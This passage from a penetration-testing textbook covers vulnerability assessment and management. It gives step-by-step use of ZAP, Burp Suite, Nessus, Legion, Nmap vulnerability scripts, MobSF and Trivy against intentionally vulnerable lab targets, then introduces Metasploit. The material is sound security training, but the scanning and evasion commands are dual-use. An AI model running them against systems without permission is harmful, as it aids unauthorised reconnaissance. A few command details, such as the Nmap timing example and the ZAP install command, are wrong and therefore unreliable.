In the following chapter, we will dive into the complexities of Vulnerability Assessment (VA) and its management through a mix of automated and manual techniques across different domains. While completing a vulnerability assessment is significant, equally vital is implementing a Vulnerability Management (VM) approach to monitor patching progress and accelerate the remediation process. Additionally, we will delve into VA prerequisites, asset prioritization, grouping, vulnerability ranking, and report generation.

Join our book’s Discord space

Join the book's Discord Workspace for Latest updates, Offers, Tech happenings around the world, New Release and Sessions with the Authors:

**[https://discord.bpbonline.com](https://discord.bpbonline.com)**

![](images/fm1.png)

# [CHAPTER 4Vulnerability Assessment and Management](#contents.xhtml_ch04a)

[Introduction](#contents.xhtml_sc2_109a)

In this chapter, we will explore Vulnerability Assessment (VA) and its associated management strategies. The primary goal of this endeavor is to empower pen testers and security experts with crucial knowledge and expertise in both manual and automated methodologies, enabling them to perform in-depth VA across various computer infrastructures.

Additionally, we will delve into the significance of accurate and targeted patch management in optimizing the overall effectiveness of VA initiatives. By the end of this chapter, you will have a robust understanding of the various techniques and best practices for conducting VA and be well-equipped to identify and remediate vulnerabilities in your organization.

[Structure](#contents.xhtml_sc2_110a)

In this chapter, we will discuss the following topics:

*   Overview of vulnerability assessment

*   Vulnerability nomenclature

*   Vulnerability management life cycle

*   Vulnerability assessment

    *   Web application

    *   Computer network

    *   Mobile application

    *   Container

*   Vulnerability management

*   Application security

    *   Static application security testing

    *   Dynamic application security testing

[Overview of vulnerability assessment](#contents.xhtml_sc2_111a)

Vulnerability assessment is an essential process for discovering security weaknesses in computer systems. The assessment leverages automated tools to pinpoint vulnerabilities and produce a report on the findings. This exercise helps organizations stay informed of their security posture, address potential threats, and prevent cyberattacks by promptly fixing newly identified weaknesses. A vulnerability assessment gives organizations crucial insights into their IT assets and security vulnerabilities. This information allows organizations to implement effective security measures and reduce the risk of cyber-attacks, ultimately improving their overall security posture.

Vulnerability assessment can be performed both manually and through automation. Automated scans are faster and require less manual effort, while manual assessments have the advantage of producing fewer false positives. A hybrid approach combines the best outcomes since automated scan findings may be manually verified to detect false positives and negatives and enhance overall scan quality.

The following are illustrations of various types of vulnerability assessment scans, depicted in [Figure 4.1](#ch04.xhtml_fig4-1):

![](images/Figure_4.1.png)

Figure 4.1: Types of vulnerability assessment scans

The following are the various types of vulnerability assessment scans:

*   Application-based vulnerability scan: It identifies security weaknesses in web applications related to code and configuration.

*   Network-based vulnerability scan: It detects vulnerabilities in network infrastructure, such as misconfigured devices, weak passwords, and open ports.

*   Wireless vulnerability scan: It searches for security weaknesses in wireless networks, including weak encryption, unsecured access points, and unauthorized access.

*   Database vulnerability scan: It evaluates a database and its connected systems for potential security risks, including misconfigured settings, weak authentication, and unprotected data.

*   Host-based vulnerability scan: It identifies vulnerabilities in a single computer or device, including misconfigured settings, outdated software, and unpatched security gaps.

| Note: To conduct a comprehensive VA scan, it is imperative to ensure that all necessary prerequisites have been met. These include obtaining the required permissions, clearly defining the scope, selecting scan type, selecting an appropriate scan window, preparing the environment, and carefully choosing the right tools and resources for the job. |

[Vulnerability nomenclature](#contents.xhtml_sc2_112a)

Vulnerability nomenclature is the naming convention used to describe vulnerabilities in applications, software, networks, or computer systems. Standardizing documentation, communication, and discussion of vulnerabilities makes it easier for security professionals to manage and identify them effectively.

A vulnerability nomenclature usually contains a unique identifier, such as a vulnerability identifier number or code, information about the vulnerability’s impact, affected systems or software, and a vulnerability description. This information is frequently stored and maintained in centralized databases, such as Common Vulnerabilities and Exposures (CVE) and Common Weakness Enumeration (CWE).

| Note: Using standardized terms and categories can enable different teams and stakeholders to better comprehend and deliberate on vulnerabilities, reducing miscommunication and effectively resolving identified vulnerabilities. |

[Vulnerability management life cycle](#contents.xhtml_sc2_113a)

The Vulnerability Management (VM) life cycle is a comprehensive and repetitive method to ensure that the ongoing security assessments are of high quality to effectively address and mitigate vulnerabilities in an organization’s computer systems and network infrastructure. The VM life cycle enables organizations to perform asset discovery, vulnerability assessment, vulnerability prioritization, reporting, remediation, and revalidation. The continuous nature of the activity requires adherence to a life cycle and guarantees continuous improvement of people, processes, and technology. Refer to [Figure 4.2](#ch04.xhtml_fig4-2) below to gain a visual understanding of the VM life cycle:

![](images/Figure_4.2.png)

Figure 4.2: Vulnerability management life cycle

| Note: Adopting a vulnerability management life cycle is a proactive cyber security approach that can bring cost savings to organizations, enabling them to identify and remediate vulnerabilities promptly, preventing potential damage and costly security breaches. |

[Vulnerability assessment](#contents.xhtml_sc2_114a)

There are several domains within computer systems where vulnerability assessments can be performed. Let us delve into some of these in practice:

[Web application](#contents.xhtml_sc3_115a)

A vulnerability scan on the web application is widely considered the gold standard for evaluating your site’s security posture, as it thoroughly examines your site against a vast array of known vulnerabilities to reveal any potential weaknesses in the application. To grasp the fundamentals of automated web application vulnerability scanning, we will explore two of the most widely used tools in the field: OWASP ZAP and Burp Suite Community Edition. To showcase the scanning procedure and evaluate the efficiency of these tools, we will utilize bWAPP, an open-source and freely accessible web application that has intentionally been made vulnerable. bWAPP offers security enthusiasts a practical experience of exploiting security weaknesses in a realistic environment.

[OWASP ZAP](#contents.xhtml_sc4_116a)

The OWASP Zed Attack Proxy (ZAP) is an intuitive and integrated Vulnerability Assessment and Penetration Testing (VAPT) tool designed to identify security flaws in web applications effortlessly. It is a powerful open-source tool designed to serve both vulnerability assessments and penetration testing, providing a comprehensive security evaluation. Let us delve into the installation process, configure the target, and understand its functioning step by step as follows:

1.  Installing OWASP ZAP: Execute the command sudo apt install proxy as depicted in [Figure 4.3](#ch04.xhtml_fig4-3) on Kali Linux:

    ![](images/Figure_4.3.png)

    Figure 4.3: Installing OWASP ZAP

2.  Launching OWASP ZAP: Upon successful installation, access the ZAP application through the Web Application Analysis tab, as demonstrated in [Figure 4.4](#ch04.xhtml_fig4-4):

    ![](images/Figure_4.4.png)

    Figure 4.4: Launching OWASP ZAP

3.  Configuring ZAP: Customize ZAP to meet your specifications before initiating the scan. This involves configuring the proxy, choosing the scan type, establishing the scan policy, and other settings, as illustrated in [Figure 4.5](#ch04.xhtml_fig4-5):

    ![](images/Figure_4.5.png)

    Figure 4.5: Configuring OWASP ZAP

4.  Initiating a scan: Click the new session button within the ZAP interface to initiate a scan. The Spider will initiate a comprehensive website crawl to gather information before the automated active scanning process commences. Enter the URL of the targeted website and click start the scan, as demonstrated in [Figure 4.6](#ch04.xhtml_fig4-6):

    ![](images/Figure_4.6.png)

    Figure 4.6: Initiating a scan

5.  Analyzing the results: Upon completion of the scan, ZAP will present a report of the vulnerabilities discovered on the targeted website. The report will include the severity of each vulnerability, a description, and suggestions for remediation, as demonstrated in [Figure 4.7](#ch04.xhtml_fig4-7). Head to the reports section and select the generate report button to generate the report. The report will be developed in HTML format.

    ![](images/Figure_4.7.png)

    Figure 4.7: Analyzing the result

| Note: Monitor the scan’s progression closely, as the scan process may take considerable time, depending on the website’s size and the extent of vulnerabilities to be evaluated. The scan’s progress can be monitored in real-time through the ZAP interface. |

[Burp suite](#contents.xhtml_sc4_117a)

Developed by PortSwigger, it is a comprehensive set of tools used for VAPT of web applications. It is available in three editions: community, professional, and enterprise. In this practice, we will use the professional edition of Burp suite.

The various tools within the Burp suite, such as the proxy, repeater, intruder, sequencer, decoder, and extender, work together seamlessly to support the entire testing process. They assist in mapping and analyzing an application’s attack surface and identifying and exploiting security vulnerabilities. Let us understand the step-by-step approach to configure the scan and gain an understanding of its functionality as follows:

1.  Launching Burp suite: Access the Burp suite application by searching for it in the Windows start menu, as demonstrated in [Figure 4.8](#ch04.xhtml_fig4-8):

    ![](images/Figure_4.8.png)

    Figure 4.8: Launching Burp suite

2.  Configuring Burp suite: Customize Burp to meet your requirements before starting a scan. Burp suite supports extensions, which are add-ons that enhance the tool’s functionality. These extensions allow you to tailor the tool to your needs and integrate custom functionality. Some of the critical extensions available on the BApp store in the Burp suite are shown in [Figure 4.9](#ch04.xhtml_fig4-9):

    ![](images/Figure_4.9.png)

    Figure 4.9: Configuring Burp suite

3.  Start a scan: Click the New Scan button within the Burp interface to initiate a scan. You can also change the configuration for crawling, auditing, and resource pooling. The crawler will initiate a comprehensive website crawl to gather information, followed by the automated active scanning process. To start the scan, enter the URL of the targeted website and click OK, as demonstrated in [Figure 4.10](#ch04.xhtml_fig4-10):

    ![](images/Figure_4.10.png)

    Figure 4.10: Starting a scan

4.  Authenticated scan: This enables the tool to perform an in-depth examination of the application and detect security vulnerabilities and other issues that may not be present during an unauthenticated scan. You can also enter login credentials into Burp, as shown in [Figure 4.11](#ch04.xhtml_fig4-11):

    ![](images/Figure_4.11.png)

    Figure 4.11: Authenticated scan

5.  Analyzing the results: Upon completion of the scan, Burp will present a report of the vulnerabilities found on the targeted website. The report will include the severity of each vulnerability, a description, and suggestions for remediation, as shown in [Figure 4.12](#ch04.xhtml_fig4-12). You have multiple options in the Issue Activity section for analyzing the findings and exploring issue details and affected endpoints.

![](images/Figure_4.12.png)

Figure 4.12: Analyzing the result

| Note: Selecting the right tool is crucial for web application VA scanning. Popular open-source and commercial options such as Burp suite, OWASP ZAP, Acunetix, and Nikto should be evaluated and tested to determine the best fit for your needs. |

[Computer network](#contents.xhtml_sc3_118a)

A network vulnerability assessment is a comprehensive evaluation aimed at identifying potential cybersecurity weaknesses and evaluating the robustness of a company’s network security measures. This process can be performed using manual and automated methods to discover open ports, identify running services and their versions, and compile a list of vulnerabilities based on the associated Common Vulnerabilities and Exposures (CVE) identification numbers. In this demonstration, we will use three practical tools, Nessus, Legion, and Nmap, to gain a hands-on understanding of the network vulnerability assessment process. To observe realistic results, we will use the Metasploitable 2 machine as our target for the demonstration.

[Nessus](#contents.xhtml_sc4_119a)

Nessus, developed by Tenable, is an extensively utilized vulnerability scanning tool that effectively identifies security weaknesses in computer systems, networks, and web applications. With its comprehensive vulnerability database, it possesses the capability to detect a wide range of potential weaknesses, including misconfigurations, control failures, and malware infections.

In terms of licensing, Nessus offers multiple options tailored to cater to diverse user requirements. As an example for this demonstration, we have Nessus Essentials, a free version specifically designed for personal and home use. However, it does have certain limitations, allowing scanning of up to a maximum of 16 IP addresses. On the other hand, Nessus Professional, a paid version, provides advanced features and capabilities suitable for small to medium-sized businesses or individual security professionals.

To use Nessus Essentials, you can follow a simple approach.

1.  Download and Install: Begin by visiting the Tenable website ([https://www.tenable.com/downloads/nessus?loginAttempted=true](https://www.tenable.com/downloads/nessus?loginAttempted=true)) and acquiring the latest version of Nessus Essentials. Follow the instructions provided in [Figure 4.13](#ch04.xhtml_fig4-13) to download and install the software:

    ![](images/Figure_4.13.png)

    Figure 4.13: Download and Install

2.  Create a User Account: Launch Nessus Essentials and carefully follow the on-screen instructions to create a user account. This step is essential to obtain the essential license key, as depicted in [Figure 4.14](#ch04.xhtml_fig4-14):

    ![](images/Figure_4.14.png)

    Figure 4.14: Create a user account

3.  Create a new scan: Once the software is set up, access the Nessus interface and navigate to the Scans tab. Select the option for creating a new scan configuration, as illustrated in [Figure 4.15](#ch04.xhtml_fig4-15):

    ![](images/Figure_4.15.png)

    Figure 4.15: Create a New Scan

4.  Customize scan settings: Adjust the scan settings to align with your specific requirements. Within the scan configuration, you have the flexibility to select various scan types, such as Basic Network Scan or Web Application Scan. Furthermore, you can configure scan policies, enable or disable specific plugins, set the scan timing, and make other necessary adjustments, as demonstrated in [Figure 4.16](#ch04.xhtml_fig4-16):

    ![](images/Figure_4.16.png)

    Figure 4.16: Customize scan settings

5.  Specify target IP addresses: In the scan configuration, indicate the desired target IP addresses or ranges you intend to scan for vulnerabilities. [Figure 4.17](#ch04.xhtml_fig4-17) provides visual guidance on this step. Alternatively, you can import a list of IP addresses from a file.

    ![](images/Figure_4.17.png)

    Figure 4.17: Specify Target IP Addresses

6.  Launch the Scan: Once you have tailored the scan settings, initiate the vulnerability scan by clicking on the Launch button. This action, as depicted in [Figure 4.18](#ch04.xhtml_fig4-18), begins the scanning process:

    ![](images/Figure_4.18.png)

    Figure 4.18: Launch the scan

7.  Analyze scan results: Upon completion, review the scan results within the Nessus interface. These results furnish comprehensive information regarding identified vulnerabilities, including their severity levels, descriptions, and recommendations for remediation. Additionally, you have the option to generate reports in various formats, such as PDF, CSV, and HTML, as shown in [Figure 4.19](#ch04.xhtml_fig4-19):

    ![](images/Figure_4.19.png)

    Figure 4.19: Analyze scan results

| Note: Formerly known as OpenVAS, Greenbone Vulnerability Management (GVM) is a renowned open-source solution. It offers the GVM Community Edition for free and the GVM Enterprise Edition for commercial use, providing comprehensive vulnerability management capabilities. |

[Legion](#contents.xhtml_sc4_120a)

It is an open-source, semi-automated network vulnerability assessment and penetration testing framework. Its GUI-based interface offers extensive customization options and the ability to automatically detect Common Vulnerabilities and Exposures (CVEs) and Common Platform Enumeration (CPEs). Legion comprises hundreds of tools and scripts to automate scans, including Nmap, Hydra, WhatWeb, Nikto, SSLyzer, SMBenum, Dirbuster, Vulners, and Webslayer. Let us understand the step-by-step approach to configure the scan and gain an understanding of its functionality as follows:

1.  Install Legion on Kali Linux: You can easily download and install it on your system if it is not installed.

2.  Launch Legion: Once installation is complete, launch the application and navigate to the main interface, as illustrated in [Figure 4.20](#ch04.xhtml_fig4-20):

    ![](images/Figure_4.20.png)

    Figure 4.20: Launch Legion

3.  Configure the scan: From the main interface, you can configure the settings, such as the target IP range, port range, and scan type. Select specific tools and scripts to run during the scan by clicking the add host button in the scan section and filling in the target details, as shown in [Figure 4.21](#ch04.xhtml_fig4-21):

    ![](images/Figure_4.21.png)

    Figure 4.21: Configure the scan

4.  Initiate the scan: After configuring the scan settings, press the Submit button to begin the scan. Legion will execute the selected tools and scripts, generating results as depicted in [Figure 4.22](#ch04.xhtml_fig4-22):

    ![](images/Figure_4.22.png)

    Figure 4.22: Initiate the scan

5.  Analyze results:  Once the scan is complete, you can analyze the results to identify potential vulnerabilities and make informed decisions on how to address them, as demonstrated in [Figure 4.23](#ch04.xhtml_fig4-23):

    ![](images/Figure_4.23.png)

    Figure 4.23: Analyze results

[NMAP](#contents.xhtml_sc4_121a)

Nmap is a free and open-source tool widely used for host discovery, port scanning, and vulnerability assessment. One of its most powerful and versatile features is the Nmap Scripting Engine (NSE), which enables users to automate various networking tasks by writing simple scripts. With the speed and efficiency you expect from Nmap, these scripts are executed in parallel. NSE scripts are categorized into various categories such as auth, broadcast, brute, default, discovery, dos, exploit, external, fuzzier, intrusive, malware, safe, version, and vuln.

It is common to perform script scanning in conjunction with port scanning, as the scripts may only run based on the port states discovered during the scan. To help you understand the Nmap scanning process, let us examine some of the Nmap scanning commands with flags:

*   Conduct a vulnerability scan:  To identify known vulnerabilities, run the command  nmap -sV --script vuln <target> on the target, as demonstrated in [Figure 4.24](#ch04.xhtml_fig4-24). The scripts listed under the vuln category will aid pen-testers in this task. Nmap will only add a vulnerability to the list once it has been identified on the target.

    ![](images/Figure_4.24.png)

    Figure 4.24: Conduct a vulnerability scan

*   Specifying targets: Nmap supports providing individual targets, subnets, ranges, and groups. For example, a target could be specified as an IP address (192.168.149.129), a subnet (192.168.149.0/24), and a range of IP addresses (192.168.149.129-150). To read the target list from a text file, run the command nmap -sV --script vuln –iL <path and target file name>, as shown in [Figure 4.25](#ch04.xhtml_fig4-25) below:

    ![](images/Figure_4.25.png)

    Figure 4.25: Specifying targets

*   Writing output: Pen-testers can write the Nmap scan output in various formats per their requirements. For example, to write the scan output in XML format, run the command nmap -sV --script vuln <target> -oX <path and filename>.xml, as shown in [Figure 4.26](#ch04.xhtml_fig4-26).

    Nmap offers five different output formats:

    *   Normal (-oN)

    *   XML (-oX)

    *   Grepable (-oG)

    *   Script Kiddie (-oS)

    *   Interactive (-oI)

        ![](images/Figure_4.26.png)

    Figure 4.26: Writing output

*   Adjusting scan timing: Nmap offers a simple approach with six timing templates that can be specified using the -T option, either by their number (0–5) or by their name. The first two templates are designed for IDS evasion. To use template 2 (polite), run the command nmap -sV –T4 --script vuln <target>, as demonstrated in [Figure 4.27](#ch04.xhtml_fig4-27).

    The names of the templates are:

    *   Paranoid (T0)

    *   Sneaky (T1)

    *   Polite (T2)

    *   Normal (T3)

    *   Aggressive (T4)

    *   Insane (T5)

        ![](images/Figure_4.27.png)

    Figure 4.27: Adjusting scan timing

*   Regulating scan speed: The --max-parallelism and --min-parallelism options can be used to control the speed of Nmap scans. For example, setting it to one prevents Nmap from sending more than one probe at a time to hosts. Another way to regulate scan speed is using the --scan-delay option. To use the --min-parallelism option, for instance, run the command nmap -sV --script vuln <target> --min-parallelism 300, as demonstrated in [Figure 4.28](#ch04.xhtml_fig4-28):

![](images/Figure_4.28.png)

Figure 4.28: Regulating scan speed

| Note: Metasploit is a potent tool recognized for its part in penetration testing. In addition to NMAP, it can also be utilized for vulnerability assessment. Its broad array of auxiliary modules, such as port scanning, fingerprinting, and web application scanning, further extends its functionality to perform diverse tasks. |

[Mobile application](#contents.xhtml_sc3_122a)

The mobile application vulnerability scan exercise aims to detect vulnerabilities in applications, databases, and APIs. Additionally, this exercise will assess the implementation of security best practices, as insecure applications may contain bugs that could put your organization’s data at risk. A mobile application vulnerability scan aims to uncover security weaknesses and potential vulnerabilities by examining the following areas:

*   Code review

*   Configuration management

*   Network communication

*   Permission checks

*   Third-party libraries and components

*   Binary analysis

*   File analysis

*   Dynamic analysis

While numerous open-source tools exist for evaluating the security of mobile applications, we will use MobSF as a hands-on illustration to gain an in-depth comprehension of the scanning process and the outcomes it generates.

[MobSF](#contents.xhtml_sc4_123a)

Mobile Security Framework (MobSF) is a comprehensive, automated security assessment framework for Android, iOS, and Windows mobile applications. MobSF can perform static and dynamic analysis to thoroughly evaluate the application’s security. The MobSF framework possesses the ability to analyze Android applications during runtime dynamically. This framework, powered by CapFuzz, a security scanner specifically designed for web APIs, also has robust web API fuzzing capabilities. The analysis results are presented in an easily accessible manner on the MobSF dashboard and can also be downloaded as reports for further analysis and review. Let us delve into the process of configuring a mobile application scan, analyzing the results, and generating a report in a step-by-step manner:

1.  Open MobSF: Navigate to the MobSF folder and run the command ./run.sh, as illustrated in [Figure 4.29](#ch04.xhtml_fig4-29):

    ![](images/Figure_4.29.png)

    Figure 4.29: Open MobSF

2.  Select static analysis: Once MobSF is initiated, access its dashboard by visiting http://0.0.0.0:8000 in your web browser. On the MobSF dashboard, choose the option for static analysis, as demonstrated in [Figure 4.30](#ch04.xhtml_fig4-30):

    ![](images/Figure_4.30.png)

    Figure 4.30: Select static analysis

3.  Upload the mobile app: Click the Upload and Analyze button and upload the target mobile application. After a successful upload, the scan will start automatically, as depicted in [Figure 4.31](#ch04.xhtml_fig4-31):

    ![](images/Figure_4.31.png)

    Figure 4.31: Upload the mobile app

4.  Analyze the results: View the results on the MobSF dashboard once the scan is complete. The results will include information on the vulnerabilities found, their severity, and recommendations for remediation, as seen in [Figure 4.32](#ch04.xhtml_fig4-32):

    ![](images/Figure_4.32.png)

    Figure 4.32: Analyze the results

5.  Generate a report: To generate the report, click the PDF Report button, as shown in [Figure 4.33](#ch04.xhtml_fig4-33):

    ![](images/Figure_4.33.png)

    Figure 4.33: Generate a report

6.  MobSF Scorecard: MobSF assigns a security score to each scanned application, indicating the percentage of security guidelines and best practices followed. To view the scorecard, go to Recent Scans and click on MobSF Scorecard, which will take you to the analytics dashboard, as demonstrated in [Figure 4.34](#ch04.xhtml_fig4-34) and [Figure 4.35](#ch04.xhtml_fig4-35):

    ![](images/Figure_4.34.png)

    Figure 4.34: Recent scans

    You can also perform a comparison scan to re-validate the findings, as shown in the Actions tab above.

![](images/Figure_4.35.png)

Figure 4.35: MobSF scorecard

| Note: We used InsecureBankv2.apk for testing, downloaded from [https://github.com/dineshshetty/Android-InsecureBankv2/blob/master/InsecureBankv2.apk](https://github.com/dineshshetty/Android-InsecureBankv2/blob/master/InsecureBankv2.apk) (Credit: Dinesh Shetty). |

[Container](#contents.xhtml_sc3_124a)

Assessing the vulnerabilities of containers is a crucial aspect of securing containerized applications. This process involves implementing security tools and policies to identify and mitigate potential threats. The benefits of using containers, such as ease of scalability, cost-effectiveness, and faster deployment, make them a popular choice for businesses. However, these advantages also make it imperative to prioritize their security. By performing vulnerability scans on container images, developers and DevOps teams can assess the security state of their deployments and take necessary steps to address any issues identified, leading to a more secure overall system. To gain a practical understanding of the concepts covered in this exercise, we will use Trivy, a command-line tool, as a reference case study. The primary objective of this assessment will be to evaluate the following essential areas:

*   Image security

*   Container runtime security

*   Network security

*   Data security

*   Access control

*   Compliance

*   Incident response and disaster recovery

[Trivy](#contents.xhtml_sc4_125a)

Trivy is an open-source, multi-faceted container security assessment tool that can scan various sources, including container images, filesystems, Git repositories, virtual machine images, Kubernetes, and AWS. Trivy can identify multiple security risks, including Operating System Package Vulnerabilities (SBOM), Common Vulnerabilities and Exposures (CVEs), Infrastructure as Code (IaC) issues and misconfigurations, sensitive information and secrets, and software licenses. To demonstrate Trivy’s capabilities in practice, we will use the vulnerables/web-dvwa container image, which contains known vulnerabilities, as a target. Now, let us delve into the process of conducting a scan and reviewing the results in a comprehensive and organized manner:

1.  Install Docker: To install Docker, run the command sudo apt install -y docker.io in the terminal, as illustrated in [Figure 4.36](#ch04.xhtml_fig4-36):

    ![](images/Figure_4.36.png)

    Figure 4.36: Install docker

2.  Enable Docker autostart: To enable Docker to automatically start when the machine reboots, run the command sudo systemctl enable docker --now, as shown in [Figure 4.37](#ch04.xhtml_fig4-37):

    ![](images/Figure_4.37.png)

    Figure 4.37: Enable Docker autostart

3.  Pull the vulnerable image: Run the command sudo docker pull vulnerables/web-dvwa to pull the vulnerable container image to Docker, as demonstrated in [Figure 4.38](#ch04.xhtml_fig4-38):

    ![](images/Figure_4.38.png)

    Figure 4.38: Pull the vulnerable image

4.  List the images: To view the list of images, run the command sudo docker images and check the image repository and tag name, as shown in [Figure 4.39](#ch04.xhtml_fig4-39):

    ![](images/Figure_4.39.png)

    Figure 4.39: List the images

5.  Run the scan: After all the setup is done, run the command sudo trivy i vulnerables/web-dvwa:latest to initiate the scan, as shown in [Figure 4.40](#ch04.xhtml_fig4-40):

    ![](images/Figure_4.40.png)

    Figure 4.40: Run the scan

6.  Ignore unfixable vulnerabilities: Run the command sudo trivy i –ignore-unfixed vulnerables/web-dvwa:latest to avoid vulnerabilities that cannot be fixed, even after updating all packages, as illustrated in [Figure 4.41](#ch04.xhtml_fig4-41):

    ![](images/Figure_4.41.png)

    Figure 4.41: Ignore unfixable vulnerabilities

7.  Analyze the scan results: To filter and display only critical and high-severity vulnerabilities, run the command sudo trivy i –ignore-unfixed –severity CRITICAL,HIGH vulnerables/web-dvwa:latest, as demonstrated in [Figure 4.42](#ch04.xhtml_fig4-42):

    ![](images/Figure_4.42.png)

    Figure 4.42: Analyze the scan results

8.  Generate a report: To save the scan results in JSON format, run the command sudo trivy i –ignore-unfixed –severity CRITICAL,HIGH –f json –o dvwascanreport.json vulnerables/web-dvwa:latest, as shown in [Figure 4.43](#ch04.xhtml_fig4-43):

    ![](images/Figure_4.43.png)

    Figure 4.43: Generate a report

9.  Convert the report: To convert the JSON results into a CSV file, visit the website [https://data.page/json/csv](https://data.page/json/csv), as illustrated in [Figure 4.44](#ch04.xhtml_fig4-44):

    ![](images/Figure_4.44.png)

    Figure 4.44: Convert the report

| Note: The security of containers can be ensured by scanning them at both the image and runtime stages. Before deployment, image scanning helps to identify vulnerabilities and misconfigurations, while runtime scanning helps monitor and detect any potential security risks during operation. |

[Vulnerability management](#contents.xhtml_sc2_126a)

Vulnerability management is a crucial aspect of maintaining the security of an organization. It involves ongoing efforts to identify, assess, and address potential security threats and weaknesses. The aim is to prevent malicious attacks and minimize the consequences of any that occur.

The process of vulnerability management typically consists of several steps. The first is vulnerability assessment, where potential risks are identified and evaluated. This can be achieved through automated scanning tools, manual penetration testing, or a combination. Next, the prioritization step involves determining which vulnerabilities pose the most significant risk to the organization and should be addressed first. This is typically done using a risk-management framework that assigns a severity score to each vulnerability based on its potential impact and the likelihood of exploitation.

Once vulnerabilities have been identified and prioritized, countermeasures are implemented to mitigate their risk. This may involve applying software patches, configuring firewalls and intrusion detection systems, training employees on safe practices, and implementing access controls.

There are two primary approaches to vulnerability management: manual and automated. Below in [Table 4.1](#ch04.xhtml_tab4-1), you can see the definitions and differences between these approaches:

| Parameters | Manual Vulnerability Management | Automated Vulnerability Management |
| Security Professional Intervention | It requires security professionals to assess systems and applications for vulnerabilities, prioritize them, and take the necessary steps to remediate them. | It involves software tools that scan systems and applications for vulnerabilities, providing automated detection, prioritization, and remediation recommendations. |
| Customization | It is more comprehensive and allows for greater control and customization | It supports less customization |
| Timing and Resource Consumption | It is time-consuming and resource-intensive | It is faster and more efficient |

Table 4.1: Vulnerability management approaches

| Note: Comprehensive vulnerability management often involves a combination of both manual and automated approaches. Although automated vulnerability management is faster and more efficient, it may only identify some vulnerabilities, and its recommendations may need more accuracy and customization than those obtained from manual assessment. |

[Application security](#contents.xhtml_sc2_127a)

Application security or AppSec encompasses the practices and procedures to discover, remedy, and avoid security weaknesses in software, hardware, and development processes at the application level. Integrating security testing into every stage of the SDLC, including requirements analysis, design, implementation, verification, and maintenance, is essential to detect and address vulnerabilities promptly and comprehensively. By incorporating AppSec practices from the outset, organizations can significantly minimize the risk of security vulnerabilities in their code, APIs, and third-party components utilized within their applications.

Two categories encompass application security:

*   Static Application Security Testing (SAST): It examines an application’s source code to detect security vulnerabilities before deployment. By identifying potential flaws early in the development process, SAST can reduce the cost and effort required to address them later.

*   Dynamic Application Security Testing (DAST): It tests an application while running to uncover security vulnerabilities, weaknesses, and other issues that may not be visible in the source code. DAST tools simulate attacks on an application to identify potential vulnerabilities that attackers could exploit, providing a more accurate assessment of an application’s overall security posture.

[Conclusion](#contents.xhtml_sc2_128a)

Throughout this chapter, you have gained a strong understanding of vulnerability assessment and the associated management strategies. This newfound knowledge and expertise will empower you to conduct in-depth vulnerability assessments using manual and automated methodologies on various computer infrastructures. The vulnerability management life cycle will encourage you to continually adopt the best security practices, ultimately reducing risk costs for your organization. Moreover, you have gained insights into the significance of accurate and targeted patch management, which will optimize the overall effectiveness of your vulnerability assessment initiatives. Armed with this knowledge, you are well-prepared to identify and remediate vulnerabilities in your organization’s computer infrastructure, making it more secure and resilient against potential cyberattacks.

The next chapter will delve into various topics, covering techniques for exploiting network vulnerabilities and gaining unauthorized access. You can engage with these techniques in a simulated real-world environment, working with network devices, databases, and servers. By the end of this chapter, you will have developed a strong foundation in network penetration testing and exploitation, enabling you to identify and address network vulnerabilities.

Join our book’s Discord space

Join the book's Discord Workspace for Latest updates, Offers, Tech happenings around the world, New Release and Sessions with the Authors:

**[https://discord.bpbonline.com](https://discord.bpbonline.com)**

![](images/fm1.png)

# [CHAPTER 5Exploiting Computer Network](#contents.xhtml_ch05a)

[Introduction](#contents.xhtml_sc2_129a)

In this chapter, we will delve deeper into the practical aspects of network pen testing by demonstrating the exploitation of vulnerabilities identified in the previous chapters. Exploiting these vulnerabilities is essential because it helps determine the severity of the vulnerability and its potential impact on the target environment. Through this chapter, we aim to provide a clear understanding of the significance and consequences of network pen testing and the importance of gathering intelligence about the target environment before choosing an attack vector.

To ensure that pen testers understand the network’s security posture comprehensively, we will be using open-source tools and manual scripts to demonstrate exploitation techniques on a test environment. This approach will enable the pen testers to simulate real-world scenarios, providing them with practical experience in identifying and exploiting vulnerabilities. Here, you will gain insight into various aspects of exploitation tools such as Metasploit and Armitage from operational and use case perspectives.

[Structure](#contents.xhtml_sc2_130a)

In this chapter, we will discuss the following topics:

*   Understanding network pen testing

*   Introduction to Metasploit

*   Metasploit database and workspace management

*   Integrating NMAP Scans with Metasploit

*   Metasploit automation

*   Starting with auxiliary and exploits

*   Manual exploitation

*   Exploitation using Armitage

[Objectives](#contents.xhtml_sc2_131a)

In this chapter, our goal is to delve into hands-on network penetration methods, demonstrating how to exploit vulnerabilities to understand their actual impact. This practical approach deepens insight into network security and highlights the importance of gathering information before an attack. Using open-source tools and manual scripts, we recreate real situations to gain a comprehensive understanding, emphasizing tools like Metasploit and Armitage from operational viewpoints. By the end of this chapter, readers will have gained practical experience to proficiently identify and exploit vulnerabilities.

[Understanding network pen testing](#contents.xhtml_sc2_132a)

Network pen testing is a crucial step in identifying and mitigating potential security risks within an organization’s network. During this process, pen testers must attempt to exploit identified vulnerable services to gain unauthorized access or perform unauthorized actions that could cause significant harm to the organization. Network pen testing encompasses all network devices, including servers, databases, and security controls. Advanced network penetration testing typically involves several phases, including Exploitation, Lateral Movement, Maintaining Access, Undoing Changes, Reporting and Documentation, and Remediation, as illustrated in [Figure 5.1](#ch05.xhtml_fig5-1) below:

![](images/Figure_5.1.png)

Figure 5.1: Advanced network penetration testing phases

It is crucial for pen testers to understand the significance and potential impact of network pen testing on the target environment. Therefore, they must have a clear understanding of the target infrastructure, including its hardware, software, and network components. This knowledge will enable pen testers to select the appropriate attack vector and techniques to exploit vulnerabilities successfully while minimizing any negative consequences. The success of a network pen testing exercise depends on the accuracy and completeness of the information gathered during the reconnaissance and vulnerability assessment phases.

| Note: While conducting pen testing in a production environment, it is crucial to ensure that the actions taken do not cause any harm or disruption to the target environment. Pen testers must maintain professionalism and adhere to ethical guidelines throughout the network pen testing exercise. |

[Introduction to Metasploit](#contents.xhtml_sc2_133a)

The Metasploit Framework, developed by HD Moore in 2003 and now maintained by Rapid7, is an open-source software tool utilized by penetration testers, security researchers, and hackers for penetration testing, vulnerability scanning, and exploit development. Written in Ruby, it is designed to offer flexibility and extensibility, enabling users to tailor their exploits and payloads. The Metasploit Framework offers a multitude of features and functionalities, as illustrated in [Figure 5.2](#ch05.xhtml_fig5-2) below:

![](images/Figure_5.2.png)

Figure 5.2: Metasploit framework features and functionalities

